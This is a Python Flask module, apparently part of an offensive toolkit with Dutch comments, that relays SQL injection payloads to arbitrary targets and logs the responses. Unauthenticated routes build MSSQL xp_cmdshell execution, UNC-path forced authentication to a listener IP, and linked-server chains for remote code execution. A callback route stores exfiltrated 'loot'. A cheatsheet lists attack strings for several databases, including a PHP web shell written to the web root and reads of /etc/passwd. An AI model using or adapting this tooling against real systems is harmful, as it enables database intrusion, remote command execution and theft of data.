from meuk.hacksec import *  # noqa: F403
from flask import Blueprint, render_template, abort, request, jsonify
from meuk.flask.models import *  # noqa: F403
from meuk.flask.security import require_dashboard_access
from app import db
import hashlib
import json
import calendar
import datetime
import requests as http_requests


sqli2_bp = Blueprint('sqli2_bp', __name__,
                    template_folder='html',
                    static_folder='static')


# ---------- MSSQL query builder helpers ----------

def _build_openquery_chain(chain, inner_query):
    """Bouw geneste OPENQUERY syntax voor linked server keten.

    chain = ['SRV02', 'SRV03'], inner_query = 'SELECT @@servername'
    -> SELECT * FROM OPENQUERY("SRV02", 'SELECT * FROM OPENQUERY("SRV03", ''SELECT @@servername'')')
    """
    if not chain:
        return inner_query
    q = inner_query
    for i, srv in enumerate(reversed(chain)):
        escaped = q.replace("'", "'" + "'" * (2 ** i))
        q = f'SELECT * FROM OPENQUERY("{srv}", \'{escaped}\')'
    return q


def _build_exec_at_chain(chain, inner_query):
    """Bouw EXEC...AT syntax voor linked server keten.

    chain = ['LINKED1'], inner_query = "xp_cmdshell 'whoami'"
    -> EXEC ('xp_cmdshell ''whoami''') AT [LINKED1]
    """
    if not chain:
        return inner_query
    q = inner_query
    for srv in reversed(chain):
        escaped = q.replace("'", "''")
        q = f"EXEC ('{escaped}') AT [{srv}]"
    return q


def _build_xpcmd_enable(command):
    """Bouw stacked queries voor xp_cmdshell activatie + uitvoering."""
    return (
        "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; "
        "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; "
        f"EXEC master..xp_cmdshell '{command}';"
    )


def _build_unc_path(listener_ip, technique='dirtree'):
    """Bouw UNC path SQL statement."""
    techniques = {
        'dirtree': f"EXEC master..xp_dirtree '\\\\{listener_ip}\\share'",
        'fileexist': f"EXEC master..xp_fileexist '\\\\{listener_ip}\\share\\test'",
        'subdirs': f"EXEC master..xp_subdirs '\\\\{listener_ip}\\share'",
    }
    return techniques.get(technique, techniques['dirtree'])


def _relay_request(url, param=None, payload=None, method='GET'):
    """Stuur een request naar het doel en geef (body, status) terug."""
    resp_body = ''
    resp_status = 0
    try:
        if method == 'POST':
            data = {}
            if param and payload:
                data[param] = payload
            r = http_requests.post(url, data=data, timeout=10, verify=False)
        else:
            target = url
            if param and payload:
                sep = '&' if '?' in target else '?'
                target = f"{target}{sep}{param}={payload}"
            r = http_requests.get(target, timeout=10, verify=False)
        resp_body = r.text[:50000]
        resp_status = r.status_code
    except http_requests.exceptions.Timeout:
        resp_body = '[!] Timeout (10s)'
    except http_requests.exceptions.RequestException as e:
        resp_body = f'[!] Request error: {str(e)[:500]}'
    return resp_body, resp_status


def _get_param(key):
    """Haal parameter op uit JSON body, form data of query string."""
    if request.is_json:
        return (request.get_json(silent=True) or {}).get(key)
    return request.form.get(key) or request.args.get(key)


# ---------- payload routes (geen auth) ----------

@sqli2_bp.route("/sqli2/inject", methods=["GET", "POST"])
def sqli2_inject():
    url = request.args.get('url') or (request.get_json(silent=True) or {}).get('url')
    param = request.args.get('param') or (request.get_json(silent=True) or {}).get('param')
    payload = request.args.get('payload') or (request.get_json(silent=True) or {}).get('payload')

    if not url:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")

    ip = request.remote_addr
    methode = request.args.get('method', 'GET').upper()

    resp_body, resp_status = _relay_request(url, param, payload, methode)

    md5 = hashlib.md5((ip + url + (payload or '')).encode()).hexdigest()
    hebben = db_sqli.query.filter_by(ip=ip, md5=md5).first()
    if hebben is None:
        record = db_sqli(
            ip=ip, doel=url, methode=methode,
            payload=payload or '', response=resp_body[:10000],
            status=str(resp_status), md5=md5,
        )
        db.session.add(record)
        db.session.commit()

    return resp_body, 200, {
        'Content-Type': 'text/plain',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
    }


@sqli2_bp.route("/sqli2/callback", methods=["GET", "POST"])
def sqli2_callback():
    ip = request.remote_addr
    data = request.args.get('data') or request.args.get('d') or ''

    if request.is_json:
        body = request.get_json(silent=True)
        if body:
            data = json.dumps(body)

    if not data and request.data:
        data = request.data.decode('utf-8', errors='replace')[:50000]

    loot_dir = os.path.join('raw', 'loot', ip, 'sqli')
    if not os.path.exists(loot_dir):
        os.makedirs(loot_dir)

    date = datetime.datetime.utcnow()
    tijdstip = calendar.timegm(date.utctimetuple())
    schrijven(f"raw/loot/{ip}/sqli/{tijdstip}_sqli.txt", data)

    md5 = hashlib.md5((ip + data[:1000]).encode()).hexdigest()
    hebben = db_sqli.query.filter_by(ip=ip, md5=md5).first()
    if hebben is None:
        record = db_sqli(
            ip=ip, doel='callback', methode='OOB',
            payload='', response=data[:10000],
            status='callback', md5=md5,
        )
        db.session.add(record)
        db.session.commit()

    return '[!] Tot ziens en bedankt voor de vis.'


# ---------- second-order sqli routes (geen auth) ----------

@sqli2_bp.route("/sqli2/secondorder/store", methods=["POST"])
def sqli2_secondorder_store():
    """Stap 1: Sla payload op bij het doel."""
    label = _get_param('label') or 'unlabeled'
    url = _get_param('url')
    param = _get_param('param')
    payload = _get_param('payload')
    method = (_get_param('method') or 'POST').upper()

    if not url or not payload:
        return jsonify({'error': 'url en payload zijn verplicht'}), 400

    ip = request.remote_addr
    resp_body, resp_status = _relay_request(url, param, payload, method)

    md5 = hashlib.md5((ip + url + payload).encode()).hexdigest()

    record = db_sqli_secondorder(
        ip=ip, label=label, stap=1,
        doel_store=url, payload=payload,
        store_response=resp_body[:10000],
        status='stored', md5=md5,
    )
    db.session.add(record)
    db.session.commit()

    return jsonify({
        'id': record.id,
        'status': 'stored',
        'store_status_code': resp_status,
        'response_preview': resp_body[:2000],
    })


@sqli2_bp.route("/sqli2/secondorder/trigger", methods=["POST"])
def sqli2_secondorder_trigger():
    """Stap 2: Trigger de opgeslagen payload."""
    store_id = _get_param('store_id')
    url = _get_param('url')
    method = (_get_param('method') or 'GET').upper()

    if not store_id or not url:
        return jsonify({'error': 'store_id en url zijn verplicht'}), 400

    record = db.session.get(db_sqli_secondorder, int(store_id))
    if not record:
        return jsonify({'error': 'store record niet gevonden'}), 404

    resp_body, resp_status = _relay_request(url, method=method)

    record.stap = 2
    record.doel_trigger = url
    record.trigger_response = resp_body[:10000]
    record.status = 'triggered'
    db.session.commit()

    return jsonify({
        'id': record.id,
        'status': 'triggered',
        'trigger_status_code': resp_status,
        'response_preview': resp_body[:2000],
    })


@sqli2_bp.route("/sqli2/secondorder/verify/<int:store_id>", methods=["GET"])
def sqli2_secondorder_verify(store_id):
    """Stap 3: Verifieer het resultaat."""
    record = db.session.get(db_sqli_secondorder, store_id)
    if not record:
        return jsonify({'error': 'record niet gevonden'}), 404

    verify_url = request.args.get('url')
    verify_response = None
    if verify_url:
        resp_body, _ = _relay_request(verify_url)
        verify_response = resp_body[:2000]

    record.stap = 3
    record.status = 'confirmed' if verify_url else 'confirmed'
    db.session.commit()

    return jsonify({
        'id': record.id,
        'label': record.label,
        'status': record.status,
        'store_url': record.doel_store,
        'trigger_url': record.doel_trigger,
        'payload': record.payload,
        'store_response': (record.store_response or '')[:2000],
        'trigger_response': (record.trigger_response or '')[:2000],
        'verify_response': verify_response,
    })


# ---------- MSSQL routes (geen auth) ----------

@sqli2_bp.route("/sqli2/mssql/exec", methods=["POST"])
def sqli2_mssql_exec():
    """Voer MSSQL query uit via relay."""
    url = _get_param('url')
    query = _get_param('query')
    technique = _get_param('technique') or 'union'
    param = _get_param('param')

    if not url or not query:
        return jsonify({'error': 'url en query zijn verplicht'}), 400

    ip = request.remote_addr

    if technique == 'stacked':
        payload = f"'; {query}--"
    elif technique == 'blind':
        payload = f"' AND 1=(SELECT 1 WHERE ({query}))--"
    else:
        payload = query

    resp_body, resp_status = _relay_request(url, param, payload, 'GET')

    md5 = hashlib.md5((ip + url + payload).encode()).hexdigest()
    hebben = db_sqli.query.filter_by(ip=ip, md5=md5).first()
    if hebben is None:
        record = db_sqli(
            ip=ip, doel=url, methode='MSSQL',
            payload=payload, response=resp_body[:10000],
            status=str(resp_status), md5=md5,
        )
        db.session.add(record)
        db.session.commit()

    return jsonify({
        'technique': technique,
        'payload_sent': payload,
        'status_code': resp_status,
        'response': resp_body[:5000],
    })


@sqli2_bp.route("/sqli2/mssql/xpcmdshell", methods=["POST"])
def sqli2_mssql_xpcmdshell():
    """xp_cmdshell helper."""
    url = _get_param('url')
    param = _get_param('param')
    command = _get_param('command') or 'whoami'
    enable = _get_param('enable')
    if enable is None:
        enable = True
    elif isinstance(enable, str):
        enable = enable.lower() not in ('false', '0', 'no')

    if not url:
        return jsonify({'error': 'url is verplicht'}), 400

    ip = request.remote_addr

    if enable:
        payload = f"'; {_build_xpcmd_enable(command)}--"
    else:
        payload = f"'; EXEC master..xp_cmdshell '{command}';--"

    resp_body, resp_status = _relay_request(url, param, payload, 'GET')

    md5 = hashlib.md5((ip + url + payload).encode()).hexdigest()
    hebben = db_sqli.query.filter_by(ip=ip, md5=md5).first()
    if hebben is None:
        record = db_sqli(
            ip=ip, doel=url, methode='MSSQL',
            payload=payload, response=resp_body[:10000],
            status=str(resp_status), md5=md5,
        )
        db.session.add(record)
        db.session.commit()

    return jsonify({
        'command': command,
        'payload_sent': payload,
        'status_code': resp_status,
        'response': resp_body[:5000],
    })


@sqli2_bp.route("/sqli2/mssql/unc", methods=["POST"])
def sqli2_mssql_unc():
    """UNC path injection helper."""
    url = _get_param('url')
    param = _get_param('param')
    listener_ip = _get_param('listener_ip')
    technique = _get_param('technique') or 'dirtree'

    if not url or not listener_ip:
        return jsonify({'error': 'url en listener_ip zijn verplicht'}), 400

    ip = request.remote_addr
    unc_sql = _build_unc_path(listener_ip, technique)
    payload = f"'; {unc_sql};--"

    resp_body, resp_status = _relay_request(url, param, payload, 'GET')

    md5 = hashlib.md5((ip + url + payload).encode()).hexdigest()
    hebben = db_sqli.query.filter_by(ip=ip, md5=md5).first()
    if hebben is None:
        record = db_sqli(
            ip=ip, doel=url, methode='MSSQL',
            payload=payload, response=resp_body[:10000],
            status=str(resp_status), md5=md5,
        )
        db.session.add(record)
        db.session.commit()

    return jsonify({
        'technique': technique,
        'unc_sql': unc_sql,
        'payload_sent': payload,
        'status_code': resp_status,
        'response': resp_body[:2000],
    })


# ---------- MSSQL Linked Server routes (geen auth) ----------

@sqli2_bp.route("/sqli2/mssql/links/discover", methods=["POST"])
def sqli2_mssql_links_discover():
    """Ontdek linked servers."""
    url = _get_param('url')
    param = _get_param('param')
    technique = _get_param('technique') or 'union'

    if not url:
        return jsonify({'error': 'url is verplicht'}), 400

    ip = request.remote_addr
    discovery_sql = "SELECT srvname FROM master..sysservers WHERE isremote=0"

    if technique == 'stacked':
        payload = f"'; {discovery_sql};--"
    else:
        payload = discovery_sql

    resp_body, resp_status = _relay_request(url, param, payload, 'GET')

    md5 = hashlib.md5((ip + url + 'link_discover').encode()).hexdigest()
    hebben = db_sqli_mssql_link.query.filter_by(ip=ip, md5=md5).first()
    if hebben is None:
        record = db_sqli_mssql_link(
            ip=ip, instance=url,
            linked_to='discovery', keten='[]',
            sysadmin=False, methode=technique,
            resultaat=resp_body[:10000], md5=md5,
        )
        db.session.add(record)
        db.session.commit()

    return jsonify({
        'payload_sent': payload,
        'status_code': resp_status,
        'response': resp_body[:5000],
    })


@sqli2_bp.route("/sqli2/mssql/links/crawl", methods=["POST"])
def sqli2_mssql_links_crawl():
    """Keten-exploratie via OPENQUERY of EXEC AT."""
    url = _get_param('url')
    param = _get_param('param')
    chain_raw = _get_param('chain')
    query = _get_param('query') or 'SELECT @@servername'
    methode = _get_param('methode') or 'openquery'

    if not url or not chain_raw:
        return jsonify({'error': 'url en chain zijn verplicht'}), 400

    ip = request.remote_addr

    if isinstance(chain_raw, str):
        try:
            chain = json.loads(chain_raw)
        except json.JSONDecodeError:
            chain = [s.strip() for s in chain_raw.split(',') if s.strip()]
    else:
        chain = chain_raw

    if methode == 'exec_at':
        nested_sql = _build_exec_at_chain(chain, query)
    else:
        nested_sql = _build_openquery_chain(chain, query)

    payload = nested_sql
    resp_body, resp_status = _relay_request(url, param, payload, 'GET')

    md5 = hashlib.md5((ip + url + json.dumps(chain) + query).encode()).hexdigest()
    hebben = db_sqli_mssql_link.query.filter_by(ip=ip, md5=md5).first()
    if hebben is None:
        record = db_sqli_mssql_link(
            ip=ip, instance=url,
            linked_to=chain[-1] if chain else '',
            keten=json.dumps(chain),
            sysadmin=False, methode=methode,
            resultaat=resp_body[:10000], md5=md5,
        )
        db.session.add(record)
        db.session.commit()

    return jsonify({
        'chain': chain,
        'nested_sql': nested_sql,
        'status_code': resp_status,
        'response': resp_body[:5000],
    })


@sqli2_bp.route("/sqli2/mssql/links/rce", methods=["POST"])
def sqli2_mssql_links_rce():
    """RCE via linked server keten."""
    url = _get_param('url')
    param = _get_param('param')
    chain_raw = _get_param('chain')
    command = _get_param('command') or 'whoami'

    if not url or not chain_raw:
        return jsonify({'error': 'url en chain zijn verplicht'}), 400

    ip = request.remote_addr

    if isinstance(chain_raw, str):
        try:
            chain = json.loads(chain_raw)
        except json.JSONDecodeError:
            chain = [s.strip() for s in chain_raw.split(',') if s.strip()]
    else:
        chain = chain_raw

    inner = _build_xpcmd_enable(command)
    nested_sql = _build_exec_at_chain(chain, inner)

    resp_body, resp_status = _relay_request(url, param, nested_sql, 'GET')

    md5 = hashlib.md5((ip + url + json.dumps(chain) + command).encode()).hexdigest()
    hebben = db_sqli_mssql_link.query.filter_by(ip=ip, md5=md5).first()
    if hebben is None:
        record = db_sqli_mssql_link(
            ip=ip, instance=url,
            linked_to=chain[-1] if chain else '',
            keten=json.dumps(chain),
            sysadmin=False, methode='rce',
            resultaat=resp_body[:10000], md5=md5,
        )
        db.session.add(record)
        db.session.commit()

    return jsonify({
        'chain': chain,
        'command': command,
        'nested_sql': nested_sql,
        'status_code': resp_status,
        'response': resp_body[:5000],
    })


# ---------- dashboard routes (auth) ----------

@sqli2_bp.route("/dashboard/sqli", methods=["GET"])
def sqli2_dashboard():
    require_dashboard_access()
    records = db_sqli.query.order_by(db_sqli.id.desc()).all()
    secondorder_records = db_sqli_secondorder.query.order_by(
        db_sqli_secondorder.id.desc()
    ).all()
    link_records = db_sqli_mssql_link.query.order_by(
        db_sqli_mssql_link.id.desc()
    ).all()
    return render_template(
        'sqli_dashboard.html',
        records=records,
        secondorder_records=secondorder_records,
        link_records=link_records,
    )


@sqli2_bp.route("/api/sqli/data", methods=["GET"])
def api_sqli_data():
    require_dashboard_access()
    records = db_sqli.query.order_by(db_sqli.id.desc()).all()
    return jsonify([{
        'id': r.id,
        'datum': r.datum.isoformat() if r.datum else None,
        'ip': r.ip,
        'doel': r.doel,
        'methode': r.methode,
        'payload': r.payload,
        'response': r.response[:2000] if r.response else '',
        'status': r.status,
    } for r in records])


@sqli2_bp.route("/api/sqli/secondorder", methods=["GET"])
def api_sqli_secondorder():
    require_dashboard_access()
    records = db_sqli_secondorder.query.order_by(
        db_sqli_secondorder.id.desc()
    ).all()
    return jsonify([{
        'id': r.id,
        'datum': r.datum.isoformat() if r.datum else None,
        'ip': r.ip,
        'label': r.label,
        'stap': r.stap,
        'doel_store': r.doel_store,
        'doel_trigger': r.doel_trigger,
        'payload': r.payload,
        'status': r.status,
    } for r in records])


@sqli2_bp.route("/api/sqli/secondorder/<int:record_id>", methods=["DELETE"])
def api_sqli_secondorder_delete(record_id):
    require_dashboard_access()
    record = db.session.get(db_sqli_secondorder, record_id)
    if not record:
        return jsonify({'error': 'not found'}), 404
    db.session.delete(record)
    db.session.commit()
    return '', 204


@sqli2_bp.route("/api/sqli/links", methods=["GET"])
def api_sqli_links():
    require_dashboard_access()
    records = db_sqli_mssql_link.query.order_by(
        db_sqli_mssql_link.id.desc()
    ).all()
    return jsonify([{
        'id': r.id,
        'datum': r.datum.isoformat() if r.datum else None,
        'ip': r.ip,
        'instance': r.instance,
        'linked_to': r.linked_to,
        'keten': r.keten,
        'sysadmin': r.sysadmin,
        'methode': r.methode,
        'resultaat': (r.resultaat or '')[:2000],
    } for r in records])


@sqli2_bp.route("/api/sqli/links/<int:record_id>", methods=["DELETE"])
def api_sqli_links_delete(record_id):
    require_dashboard_access()
    record = db.session.get(db_sqli_mssql_link, record_id)
    if not record:
        return jsonify({'error': 'not found'}), 404
    db.session.delete(record)
    db.session.commit()
    return '', 204


@sqli2_bp.route("/api/sqli/cheatsheet", methods=["GET"])
def api_sqli_cheatsheet():
    require_dashboard_access()
    return jsonify({
        'MSSQL': {
            'versie': 'SELECT @@version;',
            'gebruiker': 'SELECT SYSTEM_USER;',
            'databases': 'SELECT name FROM sys.databases;',
            'tabellen': "SELECT * FROM {db}.information_schema.tables;",
            'kolommen': "SELECT COLUMN_NAME, DATA_TYPE FROM {db}.information_schema.columns WHERE TABLE_NAME = '{tabel}';",
            'xp_cmdshell': "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';",
            'stacked': "'; WAITFOR DELAY '0:0:5'--",
            'linked_servers': "SELECT srvname, srvproduct, providername FROM master..sysservers WHERE isremote=0;",
            'linked_openquery': "SELECT * FROM OPENQUERY(\"LINKED_SERVER\", 'SELECT @@servername');",
            'linked_exec_at': "EXEC ('SELECT @@servername') AT [LINKED_SERVER]",
            'linked_xpcmd': "SELECT * FROM OPENQUERY(\"LINKED_SERVER\", 'EXEC master..xp_cmdshell ''whoami''')",
            'linked_enable_xpcmd': "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SERVER]; EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER];",
            'unc_dirtree': "EXEC master..xp_dirtree '\\\\ATTACKER_IP\\share'",
            'unc_fileexist': "EXEC master..xp_fileexist '\\\\ATTACKER_IP\\share\\test'",
            'clr_assembly': "CREATE ASSEMBLY cmd_exec FROM 0x4D5A... WITH PERMISSION_SET = UNSAFE; CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR(4000) AS EXTERNAL NAME [cmd_exec].[StoredProcedures].[cmd_exec];",
            'ole_automation': "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @output INT; EXEC sp_OACreate 'wscript.shell', @output OUT; EXEC sp_OAMethod @output, 'run', null, 'whoami';",
            'sp_oacreate': "DECLARE @o INT; EXEC sp_OACreate 'ADODB.Stream', @o OUT; EXEC sp_OASetProperty @o, 'Type', 1; EXEC sp_OAMethod @o, 'Open'; EXEC sp_OAMethod @o, 'Write', NULL, 0x4D5A...; EXEC sp_OAMethod @o, 'SaveToFile', NULL, 'C:\\temp\\payload.exe', 2;",
        },
        'PostgreSQL': {
            'versie': 'SELECT version();',
            'gebruiker': 'SELECT current_user;',
            'databases': 'SELECT datname FROM pg_database;',
            'tabellen': "SELECT table_name FROM information_schema.tables WHERE table_schema='public';",
            'kolommen': "SELECT column_name, data_type FROM information_schema.columns WHERE table_name = '{tabel}';",
            'rce': "COPY cmd_exec FROM PROGRAM 'whoami';",
            'file_read': "SELECT pg_read_file('/etc/passwd');",
        },
        'MySQL': {
            'versie': 'SELECT @@version;',
            'gebruiker': 'SELECT user();',
            'databases': 'SHOW DATABASES;',
            'tabellen': "SELECT table_name FROM information_schema.tables WHERE table_schema='{db}';",
            'kolommen': "SELECT column_name FROM information_schema.columns WHERE table_name='{tabel}';",
            'file_read': "SELECT LOAD_FILE('/etc/passwd');",
            'file_write': "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
        },
        'Oracle': {
            'versie': 'SELECT * FROM v$version;',
            'gebruiker': 'SELECT user FROM dual;',
            'databases': 'SELECT owner FROM all_tables GROUP BY owner;',
            'tabellen': "SELECT table_name FROM all_tables WHERE owner='{schema}';",
            'kolommen': "SELECT column_name FROM all_tab_columns WHERE table_name='{tabel}';",
        },
    })


@sqli2_bp.route("/api/sqli/<int:record_id>", methods=["DELETE"])
def api_sqli_delete(record_id):
    require_dashboard_access()
    record = db.session.get(db_sqli, record_id)
    if not record:
        return jsonify({'error': 'not found'}), 404
    db.session.delete(record)
    db.session.commit()
    return '', 204
